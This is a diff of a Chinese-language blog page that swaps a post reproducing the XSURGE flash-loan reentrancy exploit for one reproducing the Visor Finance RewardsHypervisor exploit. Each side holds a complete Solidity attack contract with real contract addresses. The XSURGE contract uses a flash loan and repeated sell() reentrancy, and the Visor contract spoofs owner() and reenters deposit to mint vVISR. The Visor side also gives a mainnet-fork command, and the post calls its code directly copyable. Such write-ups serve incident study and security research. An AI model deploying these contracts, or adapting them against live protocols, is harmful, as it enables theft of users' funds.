@@ -19,32 +19,25 @@
         <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
     
     <meta name="description" content="">
-    <meta name="description" content="概述8 月 17 日,BSC上的XSURGE被攻击。攻击者利用闪电贷+重入攻击反复低买高卖，导致项目损失约500万美金。">
+    <meta name="description" content="事件分析 攻击交易  10x69272d8c84d67d1da2f6425b339192fa472898dce936f24818fda415c1c1ff3f   攻击发生的块高度  113849007     攻击步骤   调用RewardsHypervisor的deposit函数, 传入参数为：  质押数量： 100000000000000000000000000 From 地址： 攻击合约自己">
 <meta property="og:type" content="article">
-<meta property="og:title" content="XSURGE_Vul_Poc">
-<meta property="og:url" content="https://w2ning.github.io/2021/12/09/XSURGE-Vul-Poc/index.html">
+<meta property="og:title" content="Visor_Finance_Vul_Poc">
+<meta property="og:url" content="https://w2ning.github.io/2021/12/30/Visor-Finance-Vul-Poc/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="概述8 月 17 日,BSC上的XSURGE被攻击。攻击者利用闪电贷+重入攻击反复低买高卖，导致项目损失约500万美金。">
+<meta property="og:description" content="事件分析 攻击交易  10x69272d8c84d67d1da2f6425b339192fa472898dce936f24818fda415c1c1ff3f   攻击发生的块高度  113849007     攻击步骤   调用RewardsHypervisor的deposit函数, 传入参数为：  质押数量： 100000000000000000000000000 From 地址： 攻击合约自己">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://w2ning.github.io/2021/12/09/XSURGE-Vul-Poc/Attack_TX.png">
-<meta property="og:image" content="https://w2ning.github.io/2021/12/09/XSURGE-Vul-Poc/Six_Times.png">
-<meta property="og:image" content="https://w2ning.github.io/2021/12/09/XSURGE-Vul-Poc/Deposit.png">
-<meta property="og:image" content="https://w2ning.github.io/2021/12/09/XSURGE-Vul-Poc/Repay.png">
-<meta property="og:image" content="https://w2ning.github.io/2021/12/09/XSURGE-Vul-Poc/Repay.png">
-<meta property="og:image" content="https://w2ning.github.io/2021/12/09/XSURGE-Vul-Poc/Code-1.png">
-<meta property="og:image" content="https://w2ning.github.io/2021/12/09/XSURGE-Vul-Poc/Code-2.png">
-<meta property="og:image" content="https://w2ning.github.io/2021/12/09/XSURGE-Vul-Poc/Attack.png">
-<meta property="og:image" content="https://w2ning.github.io/2021/12/09/XSURGE-Vul-Poc/Success.png">
-<meta property="article:published_time" content="2021-12-09T08:15:18.000Z">
-<meta property="article:modified_time" content="2021-12-09T09:12:29.698Z">
+<meta property="og:image" content="https://w2ning.github.io/2021/12/30/Visor-Finance-Vul-Poc/attack.png">
+<meta property="og:image" content="https://w2ning.github.io/2021/12/30/Visor-Finance-Vul-Poc/success.png">
+<meta property="article:published_time" content="2021-12-30T02:56:48.000Z">
+<meta property="article:modified_time" content="2021-12-30T03:02:02.601Z">
 <meta property="article:author" content="W2Ning">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://w2ning.github.io/2021/12/09/XSURGE-Vul-Poc/Attack_TX.png">
+<meta name="twitter:image" content="https://w2ning.github.io/2021/12/30/Visor-Finance-Vul-Poc/attack.png">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
     <link rel="icon" href="/assets/favicon.ico">
     
-    <title>XSURGE_Vul_Poc · W2Ning</title>
+    <title>Visor_Finance_Vul_Poc · W2Ning</title>
     <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
 /* This file is meant as a standalone workflow for
 - testing support for link[rel=preload]
@@ -269,7 +262,7 @@
                 <a href="/">学</a>
             </div>
             <div class="post-title header-element">
-                <a href="#" class="post-name">XSURGE_Vul_Poc</a>
+                <a href="#" class="post-name">Visor_Finance_Vul_Poc</a>
             </div>
         </div>
     
@@ -315,7 +308,7 @@
         <h1 class="intro-title">
             <!-- 主页  -->
             
-                XSURGE_Vul_Poc
+                Visor_Finance_Vul_Poc
             <!-- 404 -->
             
         </h1>
@@ -334,13 +327,13 @@
                 
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count word-count">629</span>Reading time: <span class="post-count reading-time">3 min</span></span>
+                        <span>Word count: <span class="post-count word-count">360</span>Reading time: <span class="post-count reading-time">1 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
                     <!-- 撰写日期 -->
                     <span class="iconfont-archer post-intro-calander">&#xe676;</span>
-                    <span class="post-intro-time">2021/12/09</span>
+                    <span class="post-intro-time">2021/12/30</span>
                     <!-- busuanzi -->
                     
                         <span id="busuanzi_container_page_pv" class="busuanzi-pv">
@@ -495,84 +488,66 @@
             <div class="container container-unloaded">
                 <main class="main post-page">
     <article class="article-entry">
-        <h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>8 月 17 日,BSC上的XSURGE被攻击。<br>攻击者利用<code>闪电贷+重入攻击</code>反复低买高卖，<br>导致项目损失约500万美金。</p>
-<span id="more"></span>
-<h2 id="事件分析"><a href="#事件分析" class="headerlink" title="事件分析"></a>事件分析</h2><ul>
-<li><p>攻击合约</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x59c686272e6f11dC8701A162F938fb085D940ad3</span><br></pre></td></tr></table></figure></li>
-<li><p>攻击交易</p>
+        <h2 id="事件分析"><a href="#事件分析" class="headerlink" title="事件分析"></a>事件分析</h2><ul>
+<li>攻击交易</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x69272d8c84d67d1da2f6425b339192fa472898dce936f24818fda415c1c1ff3f</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>攻击发生的块高度</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">13849007 </span><br></pre></td></tr></table></figure>
+
+
+<ul>
+<li>攻击步骤</li>
+</ul>
+<ol>
+<li><p>调用<code>RewardsHypervisor</code>的<code>deposit</code>函数, 传入参数为：</p>
+<ol>
+<li>质押数量： 100000000000000000000000000</li>
+<li>From 地址： 攻击合约自己的地址</li>
+<li>To 地址: 攻击者的EOA地址</li>
+</ol>
+</li>
+<li><p> 第一步操作会回调攻击合约的<code>owner</code>函数, 攻击合约的返回值为: 攻击合约自己的地址</p>
+</li>
+<li><p>第一步操作还会再次回调攻击合约的<code>delegatedTransferERC20</code>函数, 导致重入攻击<br> 在<code>delegatedTransferERC20</code>函数中, 攻击合约再次调用<code>RewardsHypervisor</code>的<code>deposit</code>函数,传入参数与第一步相同<br> (这一步我在POC中省略了)</p>
+</li>
+<li><p>绕过<code>require(IVisor(from).owner() == msg.sender)</code>的检测后, <code>RewardsHypervisor</code>合约给攻击者的EOA地址铸造了<br> <code>97624975481815716136709737</code>个<code>vVISR</code></p>
+</li>
+</ol>
+<span id="more"></span>    
+<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><ul>
+<li>fork</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npx ganache-cli  --fork https://eth-mainnet.alchemyapi.io/v2/your_api_key@13849006   -l 4294967295</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>部署攻击合约</p>
+</li>
+<li><p>因为攻击步骤过于简单, 所以下面是完整代码, 可以直接复制</p>
 </li>
 </ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x7e2a6ec08464e8e0118368cb933dc64ed9ce36445ecf9c49cacb970ea78531d2</span><br></pre></td></tr></table></figure>
-
-<p><img src="Attack_TX.png" alt="imaga"></p>
-<ul>
-<li>被攻击合约同时也是SurgeToekn合约地址</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0xE1E1Aa58983F6b8eE8E4eCD206ceA6578F036c21</span><br></pre></td></tr></table></figure>
-
-
-
-<h4 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h4><ul>
-<li>第一步 从Pancake 通过闪电贷借出 10000 个WBNB</li>
-</ul>
-<blockquote>
-<p>由于<code>PancakeSwap</code> 借鉴了<code>Uniswap V2</code>的代码,所以同样拥有<code>flashSwap</code>的功能</p>
-</blockquote>
-<blockquote>
-<p>虽然Pancake的官方文档并没有提及这一功能,但不代表它没有</p>
-</blockquote>
-<ul>
-<li>第二步 把10000个WBNB换成10000个BNB</li>
-</ul>
-<blockquote>
-<p>如果WBNB和WETH10一样提供<code>flashMint</code>就更方便了</p>
-</blockquote>
-<ul>
-<li>循环攻击SurgeToken合约(共6次)</li>
-</ul>
-<p><img src="Six_Times.png" alt="image"></p>
-<ul>
-<li>调用WBNB的<code>Deposit</code>,把赚到的<code>22191</code>个BNB存在在WBNB合约中</li>
-</ul>
-<p><img src="Deposit.png" alt="image"></p>
-<ul>
-<li>调用WBNB的<code>transfer</code>,把<code>10030</code>个WBNB归还给Pancake</li>
-</ul>
-<p><img src="Repay.png" alt="image"></p>
-<ul>
-<li>从WBNB合约中<code>Withdrawal</code>,把<code>12161</code>个WBNB取出,完成攻击</li>
-</ul>
-<p><img src="Repay.png" alt="image"></p>
-<hr>
-<h2 id="问题代码"><a href="#问题代码" class="headerlink" title="问题代码"></a>问题代码</h2><ul>
-<li><code>sell()</code> 函数中存在Low-level-call函数调用,虽然使用了<code>nonReentrant()</code>， 但无法防御其他函数被异常调用的攻击场景<br><img src="Code-1.png" alt="image"></li>
-</ul>
-<ul>
-<li><p><code>purchase</code>函数在<code>receive()</code>中触发<br><img src="Code-2.png" alt="image"></p>
-<h2 id="复现方法"><a href="#复现方法" class="headerlink" title="复现方法"></a>复现方法</h2></li>
-<li><p>攻击合约代码</p>
-</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: Apache-2.0</span><br><span class="line">pragma solidity =0.8.0;</span><br><span class="line"></span><br><span class="line">interface IpancakePair&#123;</span><br><span class="line">    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;</span><br><span class="line">    </span><br><span class="line">    function token0() external view returns (address);</span><br><span class="line">    function token1() external view returns (address);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface WBNB &#123;</span><br><span class="line"></span><br><span class="line">    function deposit() payable external;</span><br><span class="line">    function withdraw(uint wad) external;</span><br><span class="line">    function balanceOf(address account) external view returns (uint);</span><br><span class="line">    function transfer(address recipient, uint amount) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">interface Token &#123;</span><br><span class="line">    function balanceOf(address account) external view returns (uint);</span><br><span class="line">    function transfer(address recipient, uint amount) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface Surge&#123;</span><br><span class="line">    function sell(uint256 tokenAmount) external returns (bool);</span><br><span class="line">    function balanceOf(address account) external view returns (uint256);</span><br><span class="line">    function transfer(address recipient, uint256 amount) external  returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract  test&#123;</span><br><span class="line">    </span><br><span class="line">    address private constant cake_Address = 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82;</span><br><span class="line">    </span><br><span class="line">    address private constant WBNB_Address = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;</span><br><span class="line">    </span><br><span class="line">    address private constant Pancake_Pair_Address = 0x0eD7e52944161450477ee417DE9Cd3a859b14fD0;</span><br><span class="line">    </span><br><span class="line">    address public constant Surge_Address = 0xE1E1Aa58983F6b8eE8E4eCD206ceA6578F036c21;</span><br><span class="line">    </span><br><span class="line">    // 这里填你自己的测试地址</span><br><span class="line">    address public wallet = 0x8F14c19ed3d592039D2F6aD372bd809228369D77;</span><br><span class="line">    </span><br><span class="line">    uint8 public time = 0;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    function Attack()external &#123;</span><br><span class="line">    </span><br><span class="line">        // Brrow 100 WBNB</span><br><span class="line">        bytes memory data = abi.encode(WBNB_Address, 10000*1e18);</span><br><span class="line">        </span><br><span class="line">        IpancakePair(Pancake_Pair_Address).swap(0,10000*1e18,address(this),data);</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function pancakeCall(address sender, uint amount0, uint amount1, bytes calldata data) external&#123;</span><br><span class="line"></span><br><span class="line">        //把WBNB换成BNB</span><br><span class="line">        WBNB(WBNB_Address).withdraw(WBNB(WBNB_Address).balanceOf(address(this)));</span><br><span class="line">        </span><br><span class="line">        // Buy</span><br><span class="line">        (bool buy_successful,) = payable(Surge_Address).call&#123;value: address(this).balance, gas: 40000&#125;(&quot;&quot;);</span><br><span class="line">        </span><br><span class="line">        //循环6次</span><br><span class="line">        Surge(Surge_Address).sell(Surge(Surge_Address).balanceOf(address(this)));</span><br><span class="line">        Surge(Surge_Address).sell(Surge(Surge_Address).balanceOf(address(this)));</span><br><span class="line">        Surge(Surge_Address).sell(Surge(Surge_Address).balanceOf(address(this)));</span><br><span class="line">        Surge(Surge_Address).sell(Surge(Surge_Address).balanceOf(address(this)));</span><br><span class="line">        Surge(Surge_Address).sell(Surge(Surge_Address).balanceOf(address(this)));</span><br><span class="line">        Surge(Surge_Address).sell(Surge(Surge_Address).balanceOf(address(this)));</span><br><span class="line">        Surge(Surge_Address).sell(Surge(Surge_Address).balanceOf(address(this)));</span><br><span class="line">        </span><br><span class="line">        //把所有BNB换成WBNB</span><br><span class="line">        WBNB(WBNB_Address).deposit&#123;value: address(this).balance&#125;();</span><br><span class="line"></span><br><span class="line">        //还给PancakeSwap 10300个WBNB</span><br><span class="line">        Token(WBNB_Address).transfer(Pancake_Pair_Address, 10300*1e18);</span><br><span class="line">        WBNB(WBNB_Address).transfer(wallet,WBNB(WBNB_Address).balanceOf(address(this)));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        </span><br><span class="line">        if(msg.sender == Surge_Address &amp;&amp; time &lt; 6)&#123;</span><br><span class="line">        </span><br><span class="line">            (bool buy_successful,) = payable(Surge_Address).call&#123;value: address(this).balance, gas: 40000&#125;(&quot;&quot;);</span><br><span class="line"></span><br><span class="line">            time++;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: UNLICENSED</span></span><br><span class="line">pragma solidity &gt;=<span class="number">0.7</span><span class="number">.0</span> &lt;<span class="number">0.9</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">interface IRewardsHypervisor &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">deposit</span>(<span class="params"></span></span></span><br><span class="line"><span class="params"><span class="function">        uint256 visrDeposit,</span></span></span><br><span class="line"><span class="params"><span class="function">        address <span class="keyword">from</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">        address to</span></span></span><br><span class="line"><span class="params"><span class="function">    </span>) <span class="title">external</span> <span class="title">returns</span> (<span class="params">uint256 shares</span>)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">owner</span>(<span class="params"></span>) <span class="title">external</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">address</span>)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">snapshot</span>(<span class="params"></span>) <span class="title">external</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">transferOwnership</span>(<span class="params">address newOwner</span>) <span class="title">external</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">transferTokenOwnership</span>(<span class="params">address newOwner</span>) <span class="title">external</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">visr</span>(<span class="params"></span>) <span class="title">external</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">address</span>)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">vvisr</span>(<span class="params"></span>) <span class="title">external</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">address</span>)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">withdraw</span>(<span class="params"></span></span></span><br><span class="line"><span class="params"><span class="function">        uint256 shares,</span></span></span><br><span class="line"><span class="params"><span class="function">        address to,</span></span></span><br><span class="line"><span class="params"><span class="function">        address <span class="keyword">from</span></span></span></span><br><span class="line"><span class="params"><span class="function">    </span>) <span class="title">external</span> <span class="title">returns</span> (<span class="params">uint256 rewards</span>)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract poc&#123;</span><br><span class="line">    </span><br><span class="line">    address RewardsHypervisor_Address = <span class="number">0xC9f27A50f82571C1C8423A42970613b8dBDA14ef</span>;</span><br><span class="line"></span><br><span class="line">    address public EOA_Address;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="title">constructor</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line"></span><br><span class="line">        EOA_Address =  msg.sender;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">attack</span>(<span class="params"></span>) <span class="title">external</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        IRewardsHypervisor(RewardsHypervisor_Address).deposit(<span class="number">100000000000000000000000000</span>,address(<span class="built_in">this</span>),EOA_Address);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">owner</span>(<span class="params"></span>) <span class="title">external</span> <span class="title">returns</span>(<span class="params">address</span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span>(address(<span class="built_in">this</span>));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">delegatedTransferERC20</span>(<span class="params">address token, address to, uint256 amount</span>) <span class="title">external</span></span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <ul>
-<li>部署合约 点击Attack</li>
+<li>点击<code>Attack</code></li>
 </ul>
-<p><img src="Attack.png" alt="image"></p>
+<p><img src="attack.png" alt="image"></p>
 <ul>
-<li>成功</li>
+<li>攻击结束</li>
 </ul>
-<p><img src="Success.png" alt="image"></p>
+<p><img src="success.png" alt="image"></p>
 
     </article>
     <!-- license -->
     
         <div class="license-wrapper">
             <p>Author：<a href="https://w2ning.github.io">W2Ning</a>
-            <p>Link：<a href="https://w2ning.github.io/2021/12/09/XSURGE-Vul-Poc/">https://w2ning.github.io/2021/12/09/XSURGE-Vul-Poc/</a>
-            <p>Publish date：<a href="https://w2ning.github.io/2021/12/09/XSURGE-Vul-Poc/">December 9th 2021, 4:15:18 pm</a>
-            <p>Update date：<a href="https://w2ning.github.io/2021/12/09/XSURGE-Vul-Poc/">December 9th 2021, 5:12:29 pm</a>
+            <p>Link：<a href="https://w2ning.github.io/2021/12/30/Visor-Finance-Vul-Poc/">https://w2ning.github.io/2021/12/30/Visor-Finance-Vul-Poc/</a>
+            <p>Publish date：<a href="https://w2ning.github.io/2021/12/30/Visor-Finance-Vul-Poc/">December 30th 2021, 10:56:48 am</a>
+            <p>Update date：<a href="https://w2ning.github.io/2021/12/30/Visor-Finance-Vul-Poc/">December 30th 2021, 11:02:02 am</a>
             <p>License：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
@@ -581,16 +556,16 @@
         <li class="next">
             
                 <div class="nextSlogan">Next Post</div>
-                <a href="/2021/12/09/Cream-8-30-Vul-Poc/" title="Cream_8_30_Vul_Poc">
-                    <div class="nextTitle">Cream_8_30_Vul_Poc</div>
+                <a href="/2222/02/22/%E9%87%8D%E5%86%99%E4%B8%80%E4%B8%AA/" title="重写一个">
+                    <div class="nextTitle">重写一个</div>
                 </a>
             
         </li>
         <li class="previous">
             
                 <div class="prevSlogan">Previous Post</div>
-                <a href="/2021/12/09/DODO-Vul-Poc/" title="DODO_Vul_Poc">
-                    <div class="prevTitle">DODO_Vul_Poc</div>
+                <a href="/2021/12/09/MonoX-Vul-Poc/" title="MonoX_Vul_Poc">
+                    <div class="prevTitle">MonoX_Vul_Poc</div>
                 </a>
             
         </li>
@@ -717,7 +692,7 @@
                 <div class="toc-catalog">
                     <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
                 </div>
-                <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0"><span class="toc-number">1.</span> <span class="toc-text">概述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8B%E4%BB%B6%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">事件分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B"><span class="toc-number">2.0.1.</span> <span class="toc-text">攻击流程</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%97%AE%E9%A2%98%E4%BB%A3%E7%A0%81"><span class="toc-number">3.</span> <span class="toc-text">问题代码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0%E6%96%B9%E6%B3%95"><span class="toc-number">4.</span> <span class="toc-text">复现方法</span></a></li></ol>
+                <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8B%E4%BB%B6%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">事件分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0"><span class="toc-number">2.</span> <span class="toc-text">复现</span></a></li></ol>
             </div>
         
         <!-- sidebar -->
